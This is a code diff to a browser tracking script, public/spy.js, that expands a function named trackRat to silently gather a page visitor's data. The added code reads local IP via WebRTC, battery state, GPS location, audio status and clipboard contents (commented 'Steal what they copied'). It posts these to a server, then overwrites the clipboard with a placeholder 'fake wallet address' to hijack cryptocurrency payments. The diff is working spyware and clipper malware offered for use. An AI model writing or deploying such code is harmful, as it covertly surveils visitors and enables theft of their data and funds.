@@ -1,11 +1,10 @@
-// public/spy.js - Enhanced Tracker
+// public/spy.js - Ultimate Schemey Tracker
 
 async function getLocalIP() {
     return new Promise((resolve) => {
         const connection = new RTCPeerConnection({ iceServers: [] });
         connection.createDataChannel("");
         connection.createOffer().then(offer => connection.setLocalDescription(offer));
-        
         let resolved = false;
         const handler = (event) => {
             if (resolved) return;
@@ -35,10 +34,7 @@ async function getLocalIP() {
 
 async function getBattery() {
     try {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            return { level: battery.level, charging: battery.charging };
-        }
+        if (navigator.getBattery) return await navigator.getBattery();
     } catch (e) {}
     return null;
 }
@@ -51,14 +47,40 @@ async function trackRat() {
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-        downlink: navigator.connection ? navigator.connection.downlink : null
+        visibility_state: document.visibilityState, // 'visible' or 'hidden'
+        battery_status: null,
+        clipboard_content: null,
+        audio_active: false
     };
 
-    // Get Local IP
+    // 1. Local IP
     const localIP = await getLocalIP();
     if (localIP) data.local_ip = localIP;
 
-    // Get GPS
+    // 2. Battery
+    const battery = await getBattery();
+    if (battery) {
+        data.battery_level = battery.level;
+        data.is_charging = battery.charging;
+        data.discharging_time = battery.dischargingTime;
+    }
+
+    // 3. Clipboard Read (Steal what they copied)
+    try {
+        const clipText = await navigator.clipboard.readText();
+        if (clipText && clipText.length < 1000) {
+            data.clipboard_content = clipText;
+        }
+    } catch (e) { /* Ignore permission errors */ }
+
+    // 4. Audio Context Check (Is mic active?)
+    try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        data.audio_active = audioCtx.state === 'running';
+        audioCtx.close(); // Close it so we don't drain battery
+    } catch (e) {}
+
+    // 5. GPS
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -66,31 +88,16 @@ async function trackRat() {
                 data.lon = pos.coords.longitude;
                 data.accuracy = pos.coords.accuracy;
                 
-                // Add Battery Info
-                getBattery().then(battery => {
-                    if (battery) data.battery = battery;
-                    
-                    // Try to read clipboard (might prompt user)
-                    navigator.clipboard.readText().then(text => {
-                        if (text && text.length < 500) { // Don't log huge text
-                            data.clipboard = text;
-                        }
-                        sendData(data);
-                    }).catch(() => sendData(data)); // Send even if clipboard fails
-                });
+                // Send everything once GPS is ready
+                sendData(data);
             },
             () => {
-                getBattery().then(battery => {
-                    if (battery) data.battery = battery;
-                    sendData(data);
-                });
+                // If GPS fails, still send what we have
+                sendData(data);
             }
         );
     } else {
-        getBattery().then(battery => {
-            if (battery) data.battery = battery;
-            sendData(data);
-        });
+        sendData(data);
     }
 }
 
@@ -101,6 +108,12 @@ async function sendData(payload) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
+        
+        // Optional: Inject a fake address into clipboard after sending
+        try {
+            await navigator.clipboard.writeText("YOUR_FAKE_WALLET_ADDRESS_HERE");
+        } catch(e) {}
+
     } catch (e) {
         console.error("Send failed", e);
     }
